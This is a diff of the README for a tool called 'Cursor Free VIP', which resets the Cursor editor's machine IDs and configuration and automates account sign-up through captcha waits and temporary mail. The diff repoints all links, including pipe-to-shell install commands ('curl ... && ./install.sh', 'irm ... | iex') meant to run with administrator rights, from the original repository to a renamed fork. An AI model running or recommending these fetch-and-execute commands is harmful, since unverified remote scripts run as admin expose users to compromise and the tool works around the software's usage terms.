@@ -1,18 +1,3 @@
-<div align="center" markdown="1">
-   <sup>Special thanks to:</sup>
-   <br>
-   <br>
-   <a href="http://go.warp.dev/cursor-free-vip">
-      <img alt="Warp sponsorship" width="400" src="https://github.com/user-attachments/assets/ab8dd143-b0fd-4904-bdc5-dd7ecac94eae">
-   </a>
-
-### [Warp, built for coding with multiple agents.](http://go.warp.dev/cursor-free-vip)
-[Available for MacOS, Linux, & Windows](http://go.warp.dev/cursor-free-vip)<br>
-
-</div>
-
----
-
 # ➤ Cursor Free VIP
 
 <div align="center">
@@ -22,20 +7,20 @@
 
 <p align="center">
 
-[![Release](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/release/yeongpin/cursor-free-vip)](https://github.com/yeongpin/cursor-free-vip/releases/latest)
+[![Release](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/release/psipher/cursor-free-vip-main)](https://github.com/psipher/cursor-free-vip-main/releases/latest)
 [![License: CC BY-NC-ND 4.0](https://img.shields.io/badge/License-CC_BY--NC--ND_4.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-nd/4.0/)
-[![Stars](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/stars/yeongpin/cursor-free-vip)](https://github.com/yeongpin/cursor-free-vip/stargazers)
-[![Downloads](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/downloads/yeongpin/cursor-free-vip/total)](https://github.com/yeongpin/cursor-free-vip/releases/latest)
+[![Stars](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/stars/psipher/cursor-free-vip-main)](https://github.com/psipher/cursor-free-vip-main/stargazers)
+[![Downloads](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/downloads/psipher/cursor-free-vip-main/total)](https://github.com/psipher/cursor-free-vip-main/releases/latest)
 <a href="https://buymeacoffee.com/yeongpin" target="_blank"><img alt="Buy Me a Coffee" src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support%20Me-FFDA33"></a>
- [<img src="https://devin.ai/assets/deepwiki-badge.png" alt="Ask DeepWiki.com" height="20"/>](https://deepwiki.com/yeongpin/cursor-free-vip)
+ [<img src="https://devin.ai/assets/deepwiki-badge.png" alt="Ask DeepWiki.com" height="20"/>](https://deepwiki.com/psipher/cursor-free-vip-main)
 
 </p>
 
 
-<a href="https://trendshift.io/repositories/13425" target="_blank"><img src="https://trendshift.io/api/badge/repositories/13425" alt="yeongpin%2Fcursor-free-vip | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+<a href="https://trendshift.io/repositories/13425" target="_blank"><img src="https://trendshift.io/api/badge/repositories/13425" alt="psipher%2Fcursor-free-vip-main | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
 <br>
 
-<h4>Support Latest 0.49.x Version | 支持最新 0.49.x 版本</h4>
+<h4>Support Latest 0.49.x Version</h4>
 
 This tool is for educational purposes, currently the repo does not violate any laws. Please support the original project.
 This tool will not generate any fake email accounts and OAuth access.
@@ -44,47 +29,32 @@ Supports Windows, macOS and Linux.
 
 For optimal performance, run with privileges and always stay up to date.
 
-這是一款用於學習和研究的工具，目前 repo 沒有違反任何法律。請支持原作者。
-這款工具不會生成任何假的電子郵件帳戶和 OAuth 訪問。
-
-支持 Windows、macOS 和 Linux。
-
-對於最佳性能，請以管理員身份運行並始終保持最新。
-
-
 <p align="center">
   <img src="./images/product_2025-04-16_10-40-21.png" alt="new" width="800" style="border-radius: 6px;"/><br>
 </p>
 
 </div>
 
-## 🔄 Change Log | 更新日志
+## 🔄 Change Log
 
-[Watch Change Log | 查看更新日志](CHANGELOG.md)
+[Watch Change Log](CHANGELOG.md)
 
-## ✨ Features | 功能特點
+## ✨ Features
 
-* Support Windows macOS and Linux systems<br>支持 Windows、macOS 和 Linux 系統<br>
+* Support Windows macOS and Linux systems
+* Reset Cursor's configuration
+* Multi-language support (English, 简体中文, 繁體中文, Vietnamese)
 
-* Reset Cursor's configuration<br>重置 Cursor 的配置<br>
+## 🚀 Recent Improvements
 
-* Multi-language support (English, 简体中文, 繁體中文, Vietnamese)<br>多語言支持（英文、简体中文、繁體中文、越南語）<br>
+* **Enhanced Error Handling**: Robust error handling with detailed logging for better troubleshooting
+* **Improved Configuration Management**: Centralized configuration with type validation and better defaults
+* **Code Refactoring**: Better code organization with proper typing and documentation
+* **Enhanced Process Management**: Better detection and management of Cursor processes across all platforms
+* **Token Management**: Improved token validation, refresh, and extraction logic
+* **Cross-Platform Compatibility**: Better handling of platform-specific paths and behaviors
 
-## 🚀 Recent Improvements | 最近改進
-
-* **Enhanced Error Handling**: Robust error handling with detailed logging for better troubleshooting<br>增強的錯誤處理：具有詳細日誌記錄的強大錯誤處理，以便更好地進行故障排除<br>
-
-* **Improved Configuration Management**: Centralized configuration with type validation and better defaults<br>改進的配置管理：集中配置，具有類型驗證和更好的默認值<br>
-
-* **Code Refactoring**: Better code organization with proper typing and documentation<br>代碼重構：通過適當的類型和文檔實現更好的代碼組織<br>
-
-* **Enhanced Process Management**: Better detection and management of Cursor processes across all platforms<br>增強的進程管理：在所有平台上更好地檢測和管理 Cursor 進程<br>
-
-* **Token Management**: Improved token validation, refresh, and extraction logic<br>令牌管理：改進的令牌驗證、刷新和提取邏輯<br>
-
-* **Cross-Platform Compatibility**: Better handling of platform-specific paths and behaviors<br>跨平台兼容性：更好地處理特定於平台的路徑和行為<br>
-
-## 💻 System Support | 系統支持
+## 💻 System Support
 
 | Operating System | Architecture      | Supported |
 |------------------|-------------------|-----------|
@@ -92,15 +62,15 @@ For optimal performance, run with privileges and always stay up to date.
 | macOS            | Intel, Apple Silicon | ✅      |
 | Linux            | x64, x86, ARM64   | ✅         |
 
-## 👀 How to use | 如何使用
+## 👀 How to use
 
 <details open>
-<summary><b>⭐ Auto Run Script | 腳本自動化運行</b></summary>
+<summary><b>⭐ Auto Run Script</b></summary>
 
 ### **Linux/macOS**
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.sh -o install.sh && chmod +x install.sh && ./install.sh
+curl -fsSL https://raw.githubusercontent.com/psipher/cursor-free-vip-main/main/scripts/install.sh -o install.sh && chmod +x install.sh && ./install.sh
 ```
 
 ### **Archlinux**
@@ -114,82 +84,81 @@ yay -S cursor-free-vip-git
 ### **Windows**
 
 ```powershell
-irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.ps1 | iex
+irm https://raw.githubusercontent.com/psipher/cursor-free-vip-main/main/scripts/install.ps1 | iex
 ```
 
 </details>
 
-If you want to stop the script, please press Ctrl+C<br>要停止腳本，請按 Ctrl+C
+If you want to stop the script, please press Ctrl+C
 
-## ❗ Note | 注意事項
+## ❗ Note
 
-📝 Config | 文件配置
-`Win / Macos / Linux Path | 路徑 [Documents/.cursor-free-vip/config.ini]`
+📝 Config File Path: `[Documents/.cursor-free-vip/config.ini]`
 <details>
-<summary><b>⭐ Config | 文件配置</b></summary>
+<summary><b>⭐ Configuration File</b></summary>
 
 ```
 [Chrome]
-# Default Google Chrome Path | 默認Google Chrome 遊覽器路徑
+# Default Google Chrome Path
 chromepath = C:\Program Files\Google/Chrome/Application/chrome.exe
 
 [Turnstile]
-# Handle Turnstile Wait Time | 等待人機驗證時間
+# Handle Turnstile Wait Time
 handle_turnstile_time = 2
-# Handle Turnstile Wait Random Time (must merge 1-3 or 1,3) | 等待人機驗證隨機時間（必須是 1-3 或者 1,3 這樣的組合）
+# Handle Turnstile Wait Random Time (must merge 1-3 or 1,3)
 handle_turnstile_random_time = 1-3
 
 [OSPaths]
-# Storage Path | 存儲路徑
+# Storage Path
 storage_path = /Users/username/Library/Application Support/Cursor/User/globalStorage/storage.json
-# SQLite Path | SQLite路徑
+# SQLite Path
 sqlite_path = /Users/username/Library/Application Support/Cursor/User/globalStorage/state.vscdb
-# Machine ID Path | 機器ID路徑
+# Machine ID Path
 machine_id_path = /Users/username/Library/Application Support/Cursor/machineId
 # For Linux users: ~/.config/cursor/machineid
 
 [Timing]
-# Min Random Time | 最小隨機時間
+# Min Random Time
 min_random_time = 0.1
-# Max Random Time | 最大隨機時間
+# Max Random Time
 max_random_time = 0.8
-# Page Load Wait | 頁面加載等待時間
+# Page Load Wait
 page_load_wait = 0.1-0.8
-# Input Wait | 輸入等待時間
+# Input Wait
 input_wait = 0.3-0.8
-# Submit Wait | 提交等待時間
+# Submit Wait
 submit_wait = 0.5-1.5
-# Verification Code Input | 驗證碼輸入等待時間
+# Verification Code Input
 verification_code_input = 0.1-0.3
-# Verification Success Wait | 驗證成功等待時間
+# Verification Success Wait
 verification_success_wait = 2-3
-# Verification Retry Wait | 驗證重試等待時間
+# Verification Retry Wait
 verification_retry_wait = 2-3
-# Email Check Initial Wait | 郵件檢查初始等待時間
+# Email Check Initial Wait
 email_check_initial_wait = 4-6
-# Email Refresh Wait | 郵件刷新等待時間
+# Email Refresh Wait
 email_refresh_wait = 2-4
-# Settings Page Load Wait | 設置頁面加載等待時間
+# Settings Page Load Wait
 settings_page_load_wait = 1-2
-# Failed Retry Time | 失敗重試時間
+# Failed Retry Time
 failed_retry_time = 0.5-1
-# Retry Interval | 重試間隔
+# Retry Interval
 retry_interval = 8-12
-# Max Timeout | 最大超時時間
+# Max Timeout
 max_timeout = 160
 
 [Utils]
-# Check Update | 檢查更新
+# Check Update
 check_update = True
-# Show Account Info | 顯示賬號信息
+# Show Account Info
 show_account_info = True
 
 [TempMailPlus]
-# Enable TempMailPlus | 啓用 TempMailPlus（任何轉發到TempMailPlus的郵件都支持獲取驗證碼，例如cloudflare郵件Catch-all）
+# Enable TempMailPlus (any email forwarded to TempMailPlus supports verification code retrieval, e.g. cloudflare email Catch-all)
 enabled = false
-# TempMailPlus Email | TempMailPlus 電子郵件
+# TempMailPlus Email
 email = xxxxx@mailto.plus
-# TempMailPlus pin | TempMailPlus pin碼
+# TempMailPlus pin
 epin = 
 
 [WindowsPaths]
@@ -222,38 +191,31 @@ max_attempts = 3
 
 </details>
 
-* Use administrator privileges to run the script <br>請使用管理員身份運行腳本
+* Use administrator privileges to run the script
+* Confirm that Cursor is closed before running the script
+* This tool is only for learning and research purposes
+* Please comply with the relevant software usage terms when using this tool
 
-* Confirm that Cursor is closed before running the script <br>請確保在運行腳本前已經關閉 Cursor<br>
+## 🚨 Common Issues
 
-* This tool is only for learning and research purposes <br>此工具僅供學習和研究使用<br>
-
-* Please comply with the relevant software usage terms when using this tool <br>使用本工具時請遵守相關軟件使用條款
-
-## 🚨 Common Issues | 常見問題
-
-|                   如果遇到權限問題，請確保：                    |                   此腳本以管理員身份運行                    |
-|:--------------------------------------------------:|:------------------------------------------------:|
 | If you encounter permission issues, please ensure: | This script is run with administrator privileges |
+|:--------------------------------------------------:|:------------------------------------------------:|
 | Error 'User is not authorized' | This means your account was banned for using temporary (disposal) mail. Ensure using a non-temporary mail service |
-## 🤩 Contribution | 貢獻
 
-歡迎提交 Issue 和 Pull Request！
+## 🤩 Contribution
 
+Welcome to submit Issues and Pull Requests!
 
-<a href="https://github.com/yeongpin/cursor-free-vip/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=yeongpin/cursor-free-vip&preview=true&max=&columns=" />
+<a href="https://github.com/psipher/cursor-free-vip-main/graphs/contributors">
+  <img src="https://contrib.rocks/image?repo=psipher/cursor-free-vip-main&preview=true&max=&columns=" />
 </a>
 <br /><br />
 
-## 📩 Disclaimer | 免責聲明
+## 📩 Disclaimer
 
-本工具僅供學習和研究使用，使用本工具所產生的任何後果由使用者自行承擔。 <br>
+This tool is only for learning and research purposes, and any consequences arising from the use of this tool are borne by the user.
 
-This tool is only for learning and research purposes, and any consequences arising from the use of this tool are borne
-by the user.
-
-## 💰 Buy Me a Coffee | 請我喝杯咖啡
+## 💰 Buy Me a Coffee
 
 <div align="center">
   <table>
@@ -268,15 +230,15 @@ by the user.
   </table>
 </div>
 
-## ⭐ Star History | 星星數
+## ⭐ Star History
 
 <div align="center">
 
-[![Star History Chart](https://api.star-history.com/svg?repos=yeongpin/cursor-free-vip&type=Date)](https://star-history.com/#yeongpin/cursor-free-vip&Date)
+[![Star History Chart](https://api.star-history.com/svg?repos=psipher/cursor-free-vip-main&type=Date)](https://star-history.com/#psipher/cursor-free-vip-main&Date)
 
 </div>
 
-## 📝 License | 授權
+## 📝 License
 
-本項目採用 [CC BY-NC-ND 4.0](https://creativecommons.org/licenses/by-nc-nd/4.0/) 授權。
+This project is licensed under [CC BY-NC-ND 4.0](https://creativecommons.org/licenses/by-nc-nd/4.0/).
 Please refer to the [LICENSE](LICENSE.md) file for details.
